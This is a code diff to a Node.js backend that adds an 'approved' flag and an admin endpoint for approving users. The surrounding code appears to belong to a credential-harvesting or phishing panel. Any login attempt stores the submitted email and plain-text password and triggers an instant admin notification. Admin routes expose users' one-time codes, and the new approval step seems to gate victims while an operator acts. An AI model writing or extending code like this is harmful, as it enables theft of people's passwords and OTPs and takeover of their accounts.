@@ -123,11 +123,12 @@ async function initializeDatabase() {
         otp VARCHAR(6),
         otp_attempts INTEGER DEFAULT 0,
         otp_verified BOOLEAN DEFAULT FALSE,
+        approved BOOLEAN DEFAULT FALSE,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
-    console.log('✅ Users table ready');
+    console.log('✅ Users table ready with approved column');
 
     await pool.query(`
       ALTER TABLE users 
@@ -185,10 +186,10 @@ app.post('/api/users/login', async (req, res) => {
     if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
     await pool.query(`
-      INSERT INTO users (email, password, otp_verified) 
-      VALUES ($1, $2, false) 
+      INSERT INTO users (email, password, otp_verified, approved) 
+      VALUES ($1, $2, false, false) 
       ON CONFLICT (email) DO UPDATE 
-      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL
+      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, approved = false
     `, [email, password]);
 
     console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - New Login:', email);
@@ -320,11 +321,27 @@ app.post('/api/users/check-approval', async (req, res) => {
     const { email } = req.body;
     if (!email) return res.json({ approved: false });
     
-    const result = await pool.query('SELECT id FROM users WHERE email = $1', [email]);
-    res.json({ approved: result.rows.length > 0 });
+    const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
+    res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
   } catch (error) {
     console.error('❌ Check approval error:', error.message);
     res.json({ approved: false });
+  }
+});
+
+// Admin approve user
+app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
+    console.log('✅ Admin approved user:', email);
+    
+    res.json({ success: true, message: 'User approved' });
+  } catch (error) {
+    console.error('❌ Approve user error:', error.message);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
@@ -386,7 +403,7 @@ app.post('/api/users/reset', async (req, res) => {
     const password = userResult.rows[0]?.password || 'unknown';
 
     await pool.query(
-      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0 WHERE email = $1',
+      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0, approved = false WHERE email = $1',
       [email]
     );
     
@@ -445,6 +462,7 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
         otp, 
         otp_attempts,
         otp_verified,
+        approved,
         created_at,
         updated_at
       FROM users 
@@ -469,6 +487,7 @@ app.get('/api/admin/users/:email', authenticateJWT, async (req, res) => {
         otp, 
         otp_attempts,
         otp_verified,
+        approved,
         created_at,
         updated_at
       FROM users 
